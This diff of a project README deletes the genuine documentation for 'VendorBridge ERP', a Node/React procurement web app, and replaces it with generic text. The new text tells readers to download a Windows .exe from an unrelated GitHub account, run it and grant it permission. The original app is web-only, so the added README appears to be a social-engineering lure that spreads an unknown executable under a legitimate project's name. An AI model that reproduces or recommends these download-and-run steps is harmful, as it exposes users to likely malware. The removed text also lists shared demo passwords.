@@ -1,476 +1,115 @@
-<div align="center">
-
-# ⚡ VendorBridge ERP
-
-### Built by **Team Clickjack** — for the ones who ship, not just talk.
-
-[![Live Demo](https://img.shields.io/badge/🚀_Live_Demo-odoo--vendorbridge.onrender.com-0ea5e9?style=for-the-badge)](https://odoo-vendorbridge.onrender.com)
-[![GitHub](https://img.shields.io/badge/GitHub-Repo-181717?style=for-the-badge&logo=github)](https://github.com/Notanormaldev/Odoo_VendorBridge)
-
-> A full-stack, production-grade **Procurement & Vendor Management ERP** —  
-> AI-powered · Real-time · Multi-role · Fully responsive
-
-</div>
-
----
-
-## 📸 Preview
-
-| Dashboard | RFQs |
-|-----------|------|
-| ![Dashboard](./Screenshot/Dashboard.jpeg) | ![RFQs](./Screenshot/RFQs.jpeg) |
-
-| Invoices | Activity Logs |
-|----------|---------------|
-| ![Invoices](./Screenshot/Invoices.jpeg) | ![Logs](./Screenshot/ActiveLogs.jpeg) |
-
-### 📱 Mobile — Pixel Perfect
-
-| Mobile Dashboard | Mobile Reports | Mobile RFQs |
-|-----------------|----------------|-------------|
-| <img src="./Screenshot/mobileview1.png" width="260"/> | <img src="./Screenshot/mobileview2.png" width="260"/> | <img src="./Screenshot/mobileview3.png" width="260"/> |
-
----
-
-
-## 🔑 Test Credentials — Jump Right In
-
-> No signup needed. Use these accounts to explore every role instantly.
-
-| Role | Email | Password |
-|------|-------|----------|
-| 👑 Admin | test_admin@vendorbridge.com | TestPass123 |
-| 🧑‍💼 Manager | test_manager@vendorbridge.com | TestPass123 |
-| 📋 Officer | test_officer@vendorbridge.com | TestPass123 |
-| 🏢 Vendor | test_vendor1@vendorbridge.com | TestPass123 |
-
-## 🧠 What is VendorBridge?
-
-VendorBridge digitizes the **entire B2B procurement lifecycle** — from RFQ creation to vendor bidding, multi-level approvals, auto-generated Purchase Orders, Tax Invoices, and real-time notifications.
-
-This is **not** a CRUD app. It's a system that thinks.
-
-- 🔐 **Role-based access control** — Admin → Manager → Officer → Vendor
-- ⚡ **Real-time notifications** via Socket.IO private user rooms
-- 🤖 **AI Procurement Assistant (ZErio)** — Gemini 2.5 Flash + LangChain + SSE streaming
-- 🧱 **Redis-backed** rate limiting & response caching
-- 🔑 **Dual-auth** — OTP email verification + Google OAuth 2.0
-- 📄 **Auto PDF invoices** — PDFKit → ImageKit CDN → Brevo email delivery
-- 📊 **MongoDB aggregation pipelines** for multi-dimensional analytics
-
----
-
-## 🏗️ System Architecture
-
-```
-┌───────────────────────────────────────────────────────────────────┐
-│                   CLIENT  (React 19 + Vite 8)                     │
-│  Redux Toolkit · React Router v7 · Recharts · Socket.IO Client    │
-│  React Hook Form + Zod · ImageKit React · Lucide Icons            │
-└─────────────────────────┬─────────────────────────────────────────┘
-                          │  HTTPS / WSS
-┌─────────────────────────▼─────────────────────────────────────────┐
-│                  SERVER  (Express 5 + Node.js ESM)                │
-│                                                                   │
-│  ┌────────────┐   ┌──────────────┐   ┌──────────────────────┐    │
-│  │ REST APIs  │   │  Socket.IO   │   │  SSE Stream (AI)     │    │
-│  │ 11 routers │   │  Real-time   │   │  LangChain + Gemini  │    │
-│  └─────┬──────┘   └──────┬───────┘   └──────────────────────┘    │
-│        │                 │                                         │
-│  ┌─────▼─────────────────▼──────────────────────────────────┐     │
-│  │   Helmet · CORS · Redis Rate Limiter · JWT verifyToken    │     │
-│  │   Role Guard (allowRoles) · Multer · express-validator    │     │
-│  └─────┬─────────────────────────────────────────────────────┘     │
-└────────│──────────────────────────────────────────────────────────┘
-         │
-┌────────▼──────────────────────────────────────────────────────────┐
-│                     Data / Services Layer                          │
-│                                                                    │
-│  MongoDB Atlas (Mongoose)          Redis (Upstash)                 │
-│  ├─ 9 Schemas + indexes            ├─ Rate limit (100 req/min)     │
-│  ├─ Aggregation Pipelines          ├─ Dashboard cache (5 min TTL)  │
-│  └─ Pre-save hooks (auto IDs)      ├─ Analytics cache (15 min TTL) │
-│                                    └─ AI chat history (24h TTL)    │
-│                                                                    │
-│  ImageKit CDN                      Brevo SMTP                      │
-│  ├─ Vendor logos                   ├─ OTP verification emails       │
-│  ├─ RFQ attachments                ├─ Password reset emails         │
-│  └─ Invoice PDFs                   └─ Invoice PDF delivery          │
-└────────────────────────────────────────────────────────────────────┘
-```
-
----
-
-## ⚙️ Tech Stack
-
-| Layer | Technology | Why |
-|-------|-----------|-----|
-| **Frontend** | React 19 + Vite 8 | Concurrent rendering, fast HMR, ESM-native |
-| **State** | Redux Toolkit | Predictable global state for auth + notifications |
-| **Forms** | React Hook Form + Zod | Zero-rerender perf + schema-driven validation |
-| **Charts** | Recharts | Composable, responsive; no resize loop issues |
-| **Backend** | Express 5 (ESM) | Native ES modules, async error propagation |
-| **Database** | MongoDB + Mongoose | Flexible docs for nested procurement data |
-| **Cache** | Redis (ioredis) | Sub-ms reads; sliding window rate limiting |
-| **Real-time** | Socket.IO | Private rooms (`user:<id>`) for targeted push |
-| **AI** | LangChain + Gemini 2.5 Flash | SSE streaming, Redis chat history (20 turns, 24h TTL) |
-| **Auth** | JWT + Passport Google OAuth | httpOnly cookies; SSO + OTP fallback |
-| **Email** | Brevo API + Nodemailer | API key prefix detection; transparent SMTP fallback |
-| **CDN** | ImageKit | Logos, PDFs; fallback to local buffer if upload fails |
-| **Security** | Helmet.js | 14+ HTTP headers (HSTS, XSS, X-Frame-Options…) |
-| **PDF** | PDFKit | Stream-based A4 Tax Invoice with GST breakdowns |
-| **Logs** | Winston + Morgan | Structured server logs; HTTP access logs |
-
----
-
-## 🔐 Security Architecture
-
-### 1. HTTP Security Headers
-```js
-app.use(helmet({ contentSecurityPolicy: false }));
-// X-DNS-Prefetch-Control, X-Frame-Options, HSTS,
-// X-Content-Type-Options, X-XSS-Protection, Referrer-Policy…
-```
-
-### 2. Redis Rate Limiter — Sliding Window
-```js
-const hits = await redis.incr(key);            // atomic increment
-if (hits === 1) await redis.expire(key, 60);   // TTL only on first hit
-if (hits > 100) return 429 + Retry-After;
-// Redis down → fail-open (graceful degradation)
-```
-
-### 3. JWT Dual-Token Pattern
-- **Access Token** — 15 min, `httpOnly` cookie (XSS-safe)
-- **Refresh Token** — 7 days, separate cookie
-- Middleware checks `req.cookies.accessToken` → falls back to `Authorization: Bearer`
-
-### 4. Role-Based Access Control
-```
-Admin   → Full access
-Manager → L2 approve/reject, view all
-Officer → Create RFQs/Approvals, view own
-Vendor  → See assigned RFQs, submit bids, view own POs/Invoices
-```
-```js
-router.post('/rfqs', verifyJWT, allowRoles('admin', 'manager', 'officer'), createRFQ);
-router.post('/approvals/:id/action', verifyJWT, allowRoles('admin', 'manager'), processApprovalAction);
-```
-
----
-
-## ⚡ Real-Time — Socket.IO
-
-```
-Client connects  →  socket.emit('join', userId)
-                 →  server: socket.join(`user:${userId}`)
-
-Server event     →  io.to(`user:${userId}`).emit('notification', data)
-                 →  Only that user. Private room, not broadcast.
-```
-
-Triggered on: L1/L2 approval actions, PO issuance, invoice generation + email delivery.
-
----
-
-## 🤖 AI Assistant — ZErio (LangChain + Gemini)
-
-```
-User Message
-     │
-     ▼
-Redis: GET chat:{sessionId}             ← Last 20 messages
-     │
-     ▼
-Build: [SystemPrompt, ...history, HumanMessage]
-     │
-     ▼
-LangChain ChatGoogleGenerativeAI        ← model.stream() → async generator
-     │
-     ▼
-SSE:  res.write(`data: ${JSON.stringify({ text })}\n\n`)
-     │
-     ▼
-Redis: SET chat:{sessionId} EX 86400    ← Save history (24h TTL)
-```
-
-Edge cases: Redis down → empty history (fail-open). Stream error → clean SSE error chunk. History pruned to 20 turns to avoid token overflow.
-
----
-
-## 📄 Auto Invoice Pipeline
-
-```
-L2 Approver clicks "Approve"
-         │
-         ▼
-1.  Create PurchaseOrder         (auto PO number: PO-YYYY-NNNN)
-         │
-2.  Calculate GST                CGST 9% + SGST 9%
-         │
-3.  Generate Tax Invoice PDF     PDFKit, A4
-         │
-4.  Upload PDF → ImageKit CDN    (/invoices/)
-         │                           ↓ fail → keep Buffer in memory
-5.  Save Invoice (pdfUrl + pdfFileId)
-         │
-6.  Email PDF to Vendor          Brevo API (base64 attachment)
-         │
-7.  Socket.IO events             → Officer (PO issued) + Vendor (invoice)
-         │
-8.  Write ActivityLog            poId + invoiceId metadata
-```
-
----
-
-## 📊 MongoDB Aggregation Pipelines
-
-3 parallel aggregations on the Reports endpoint:
-
-```js
-// 1. Spend by Category (6-month window)
-PurchaseOrder.aggregate([
-  { $match: { status: { $ne: 'cancelled' }, createdAt: { $gte: sixMonthsAgo } } },
-  { $lookup: { from: 'vendors', ... } },
-  { $group: { _id: '$vendorDetails.category', totalSpend: { $sum: '$grandTotal' } } },
-  { $sort: { totalSpend: -1 } }
-])
-
-// 2. Monthly Invoice Trend (rolling 6 months)
-Invoice.aggregate([
-  { $group: { _id: { month: { $month: '$createdAt' }, year: { $year: '$createdAt' } },
-    total: { $sum: '$grandTotal' } } },
-  { $sort: { '_id.year': 1, '_id.month': 1 } }
-])
-
-// 3. Top 5 Vendors by Spend
-PurchaseOrder.aggregate([
-  { $group: { _id: '$vendor', totalSpend: { $sum: '$grandTotal' }, poCount: { $sum: 1 } } },
-  { $sort: { totalSpend: -1 } }, { $limit: 5 },
-  { $lookup: { from: 'vendors', ... } }
-])
-```
-
-Cache TTLs: Dashboard → 5 min | Analytics → 15 min | Keys include `userId` (role-aware).
-
----
-
-## 🛡️ Edge Cases — Nothing Breaks
-
-| Scenario | Handling |
-|----------|----------|
-| Redis connection failure | Fail-open — rate limiter passes; AI uses empty history |
-| ImageKit upload failure | Graceful — PDF buffer kept in memory, `pdfUrl` set to null |
-| Brevo API error | Caught + logged — invoice saved anyway, email failure doesn't break PO |
-| Google account linking | `$or: [{googleId}, {email}]` — no duplicate accounts |
-| Concurrent approval actions | `findById` + immediate status check — no double-processing |
-| Socket.IO user not connected | `emitToUser` silently no-ops |
-| OTP expiry | 5-min Redis TTL — expired = clear 400 error |
-| Gemini stream timeout | `try/catch` on `for await` — SSE error chunk before close |
-| Inactive user account | `user.isActive` check in JWT middleware → 403 |
-| Role escalation attempt | `allowRoles(...)` guard on every protected route |
-
----
-
-## 🔑 Auth Flow
-
-```
-Email/Password:
-  Register → OTP email (Brevo) → Verify OTP → JWT in httpOnly cookie
-
-Google OAuth:
-  Login with Google → Passport GoogleStrategy → Find or create user
-  → isNew flag → /auth/callback?token=... → Frontend extracts token
-
-Token Refresh:
-  Access (15m) expires → /api/auth/refresh
-  → Refresh (7d) verified → New access token issued
-```
-
----
-
-## 👥 Role Access Matrix
-
-| Action | Admin | Manager | Officer | Vendor |
-|--------|:-----:|:-------:|:-------:|:------:|
-| Create RFQ | ✅ | ✅ | ✅ | ❌ |
-| Publish RFQ / Assign Vendors | ✅ | ✅ | ✅ | ❌ |
-| Submit Quotation | ❌ | ❌ | ❌ | ✅ |
-| Initiate Approval | ✅ | ✅ | ✅ | ❌ |
-| L1 Approve / Reject | ✅ | ✅ | ❌ | ❌ |
-| L2 Final Approve / Reject | ✅ | ✅ | ❌ | ❌ |
-| View All Approvals | ✅ | ✅ | Own only | ❌ |
-| View All POs / Invoices | ✅ | ✅ | ✅ | Own only |
-| Download Invoice PDF | ✅ | ✅ | ✅ | ✅ |
-| Analytics Dashboard | ✅ | ✅ | ✅ | ❌ |
-| Manage Vendors | ✅ | ✅ | ❌ | ❌ |
-| AI Chat (ZErio) | ✅ | ✅ | ✅ | ✅ |
-
----
-
-## 📡 API Overview
-
-```
-POST   /api/auth/register           Register + send OTP
-POST   /api/auth/verify-otp         Verify OTP → issue tokens
-POST   /api/auth/login              Email/Password login
-POST   /api/auth/refresh            Refresh access token
-GET    /api/auth/google             Google OAuth initiate
-GET    /api/auth/google/callback    Google OAuth callback
-
-GET    /api/vendors                 List vendors (cached)
-POST   /api/vendors                 Create vendor
-PUT    /api/vendors/:id             Update vendor
-DELETE /api/vendors/:id             Delete vendor
-
-GET    /api/rfqs                    List RFQs (role-filtered)
-POST   /api/rfqs                    Create RFQ
-PUT    /api/rfqs/:id/publish        Publish RFQ to vendors
-POST   /api/rfqs/:id/assign         Assign vendors to RFQ
-
-POST   /api/quotations              Submit vendor bid
-GET    /api/quotations/rfq/:rfqId   Get bids for an RFQ
-
-POST   /api/approvals               Initiate approval workflow
-GET    /api/approvals               List approvals (role-filtered)
-POST   /api/approvals/:id/action    L1/L2 approve or reject
-
-GET    /api/purchase-orders         List POs
-GET    /api/invoices                List invoices
-GET    /api/invoices/:id/pdf        Stream invoice PDF
-
-GET    /api/reports/dashboard       Dashboard stats (Redis cached, role-aware)
-GET    /api/reports/analytics       Aggregation analytics (Redis cached)
-GET    /api/reports/export          CSV export of all POs
-
-POST   /api/chat/stream             SSE AI chat (LangChain + Gemini)
-GET    /api/activity                Activity log feed
-
-POST   /api/upload/image            Upload image to ImageKit
-```
-
----
-
-## 🧩 Data Models
-
-| Model | Key Fields |
-|-------|-----------|
-| `User` | email, passwordHash, role, isVerified, isActive, googleId, refreshToken |
-| `Vendor` | companyName, gstNumber, category, linkedUser, rating, totalOrders, totalSpend, logo |
-| `RFQ` | rfqNumber (auto), title, lineItems[], assignedVendors[], status, attachments[] |
-| `Quotation` | rfq, vendor, items[], subtotal, gstPercent, grandTotal, deliveryDays, status |
-| `Approval` | rfq, vendor, quotation, steps[{label, approver, status, remarks}], currentStep, overallStatus |
-| `PurchaseOrder` | poNumber (auto), rfq, vendor, lineItems[], subtotal, cgstAmount, sgstAmount, grandTotal |
-| `Invoice` | invoiceNumber (auto), po, vendor, lineItems[], cgst, sgst, grandTotal, pdfUrl, sentAt |
-| `Notification` | user, title, message, type, link, isRead |
-| `ActivityLog` | action, entity, entityId, entityTitle, performedBy, meta{} |
-
-All schemas use **compound indexes**:
-```js
-rfqSchema.index({ status: 1, createdBy: 1, deadline: 1 });
-```
-
----
-
-## 📁 Project Structure
-
-```
-VendorBridge/
-├── Backend/
-│   ├── config/
-│   │   ├── index.js            # Centralized env config
-│   │   ├── db.js               # Mongoose connection
-│   │   ├── redis.js            # ioredis client
-│   │   ├── socket.js           # Socket.IO init + emitToUser helper
-│   │   └── imagekit.js         # ImageKit SDK
-│   ├── controllers/            # 11 controllers
-│   ├── middleware/
-│   │   ├── auth.js             # verifyJWT + allowRoles
-│   │   ├── rateLimiter.js      # Redis sliding-window rate limiter
-│   │   ├── errorHandler.js     # Global async error handler
-│   │   ├── upload.js           # Multer (memory storage)
-│   │   └── validate.js         # express-validator checker
-│   ├── models/                 # 9 Mongoose schemas
-│   ├── routes/                 # 11 Express routers
-│   ├── services/
-│   │   ├── chatService.js      # LangChain + Gemini SSE
-│   │   ├── emailService.js     # Brevo API + Nodemailer fallback
-│   │   ├── pdfService.js       # PDFKit + ImageKit upload
-│   │   ├── notificationService.js
-│   │   ├── otpService.js       # 6-digit OTP + Redis TTL
-│   │   ├── authService.js      # JWT helpers
-│   │   └── mediaService.js     # ImageKit file deletion
-│   ├── utils/
-│   │   ├── ApiError.js
-│   │   ├── ApiResponse.js
-│   │   └── asyncHandler.js
-│   └── server.js
-│
-└── frontend/
-    └── src/
-        ├── components/
-        │   ├── layout/         # AppLayout, Sidebar, Topbar
-        │   ├── common/         # Card, Table, Modal, Badge
-        │   └── chat/           # ChatPanel (SSE consumer)
-        ├── pages/              # Dashboard, Vendors, RFQs, Approvals,
-        │                       # PurchaseOrders, Invoices, Reports, Activity
-        │   └── auth/           # Login, Register, ForgotPassword, AuthCallback
-        ├── services/
-        │   └── api.js          # Axios + interceptors
-        ├── store/              # Redux slices (auth, notification)
-        └── main.jsx
-```
-
----
-
-## 🚀 Deployment
-
-Deployed as a **monorepo on [Render](https://render.com)**:
-
-- Backend serves as the primary web service
-- Frontend pre-built via `vite build` — served as static files from `frontend/dist/`
-- SPA routing via Express wildcard → `index.html`
-- All env vars configured in Render dashboard
-
-> ℹ️ Free tier cold-starts after 50s idle — first request may take ~10-15s. That's Render, not the app.
-
-**Live:** [https://odoo-vendorbridge.onrender.com](https://odoo-vendorbridge.onrender.com)
-
----
-
-## 🎯 What Makes This Different
-
-**1. End-to-end automation**  
-One approval click triggers: PO creation → GST calculation → PDF generation → CDN upload → Email delivery → Real-time notification. Zero manual steps.
-
-**2. Production security posture**  
-Helmet headers + Redis rate limiting + JWT in httpOnly cookies + role guards on every single route. Not an afterthought.
-
-**3. AI with memory**  
-ZErio maintains full conversation history per session (Redis, 24h TTL, last 20 turns) and streams tokens progressively. Knows your platform from a rich system prompt.
-
-**4. Resilient by design**  
-Every external service — Redis, ImageKit, Brevo, Gemini — has explicit error handling with graceful fallbacks. The system degrades gracefully, never hard-crashes.
-
-**5. Multi-role, not multi-tenant**  
-The same app serves procurement officers, finance managers, and external vendors with completely different views and permissions on the same data.
-
----
-
-## 🛠️ Full Stack
-
-| Side | Tools |
-|------|-------|
-| **Frontend** | React 19, Vite 8, Redux Toolkit, React Router v7, Recharts, Zod, React Hook Form, Socket.IO Client, Lucide React, React Hot Toast, date-fns, imagekitio-react |
-| **Backend** | Node.js ESM, Express 5, Mongoose, ioredis, Socket.IO, Passport.js, LangChain, @langchain/google-genai, PDFKit, Multer, nodemailer, bcryptjs, jsonwebtoken, helmet, morgan, winston, express-validator, uuid |
-| **Infrastructure** | MongoDB Atlas, Redis (Upstash), ImageKit CDN, Brevo Email, Render |
-
----
-
-<div align="center">
-
-**Built with ⚡ by Team Clickjack**
-
-*We don't just build features. We build systems.*
-
-</div>
+# 📦 Odoo_VendorBridge - Streamline your procurement and vendor tasks
+
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Auditorycortexarkansasriver911/Odoo_VendorBridge)
+
+Odoo_VendorBridge manages your company procurement and vendor interactions. The software tracks orders, processes invoices, and automates approvals. It provides tools for vendor communication and data management.
+
+## 📋 System Requirements
+
+Ensure your computer meets these requirements before you start:
+
+- Windows 10 or Windows 11.
+- 8 GB of RAM or more.
+- 500 MB of available storage space.
+- An active internet connection.
+- A modern web browser like Google Chrome or Microsoft Edge.
+
+## 📥 Downloading the Application
+
+Visit this page to download: [https://github.com/Auditorycortexarkansasriver911/Odoo_VendorBridge](https://github.com/Auditorycortexarkansasriver911/Odoo_VendorBridge)
+
+To download the version for Windows:
+
+1. Open the link above in your web browser.
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the most recent version number.
+4. Scroll to the Assets section.
+5. Click the file ending in .exe to begin the download.
+6. Wait for the download to finish.
+
+## 🛠️ Installation Steps
+
+Follow these steps to set up the software:
+
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installer.
+3. Click Yes if Windows asks for permission to run the application.
+4. Follow the instructions on the screen.
+5. Click Finish when the process completes.
+6. An icon for Odoo_VendorBridge now appears on your desktop.
+
+## 🚀 Getting Started
+
+Launch the shortcut from your desktop to open the application. The program opens a login screen in your default web browser.
+
+1. Click the Login with Google button.
+2. Select your work email address.
+3. Enter your password if prompted.
+4. Read and accept the permissions for access.
+5. The main dashboard displays your current vendor list and active orders.
+
+## 📈 Key Features
+
+### Vendor Management
+Store contact details, track performance, and view history for every provider. The system highlights vendors who deliver products on time and identifies those who miss deadlines.
+
+### Automated Procurement
+The software creates digital purchase orders automatically. It tracks requests from creation to final delivery.
+
+### Approval Workflows
+Set up rules to approve expenses. The system sends alerts to managers when a request requires review. A two-level approval process ensures that every transaction receives proper scrutiny before payment.
+
+### AI Assistance
+The built-in assistant answers questions about your data. Ask the assistant to find specific invoices or summarize vendor spending for the month. It processes the information and gives you clear answers.
+
+### PDF Invoicing
+The system creates professional PDF invoices for every order. It applies your logo and details to each document automatically before sending them to the vendor.
+
+### Email Integration
+The software connects to your mail services. It sends automated notifications regarding order status, feedback requests, and payment reminders.
+
+## 🔒 Security
+
+Odoo_VendorBridge protects your data using industry standards. All connections use encrypted tunnels to keep information private. The software uses tokens to verify identity, which prevents unauthorized access to your account. We limit the number of requests to the system to ensure stable performance for all users.
+
+## ⚙️ Configuration
+
+Open the Settings menu from the top navigation bar to change your preferences:
+
+- Profile: Update your name and notification email.
+- Notifications: Choose which events trigger an email alert.
+- Integration: Link your account to file storage services for invoice backups.
+- AI Assistant: Toggle the AI features on or off based on your needs.
+
+## 💡 Using the AI Assistant
+
+Click the chat icon at the bottom of the screen to open the AI tool. Type your question in the text box. The assistant searches your database and returns relevant information. You can ask things like:
+
+- How many orders are pending approval?
+- Which vendor provides the fastest shipping?
+- Summarize the invoices for last week.
+
+The assistant provides direct answers to help you make decisions faster.
+
+## 🛠️ Troubleshooting
+
+If the software fails to launch, try these steps:
+
+1. Restart your computer.
+2. Check your internet connection.
+3. Ensure your web browser is up to date.
+4. Reinstall the application using the installer file.
+
+If the login fails, verify that you are using a valid work email account. Ensure your network does not block the authentication service. If issues persist, contact your IT department for assistance with local network permissions.
+
+## 🔄 Updates
+
+The software checks for updates whenever you launch it. If a new version exists, the program shows a notice. Click Update to download and install the latest features and security improvements. The process takes a few minutes. Your data remains safe during the update.
+
+## 🏢 Managing Vendors
+
+Go to the Vendors tab to manage your list. Click Add New to input vendor details. You can upload documents like contracts or tax forms directly to the vendor profile. Use the filter tools to sort vendors by region, service type, or performance rating.
+
+## 📝 Handling Invoices
+
+The system generates invoices once a request receives approval. View your invoices in the Invoices tab. You can download these files as PDFs or email them directly from the platform. The system marks invoices as paid once you confirm the payment in your accounting software.
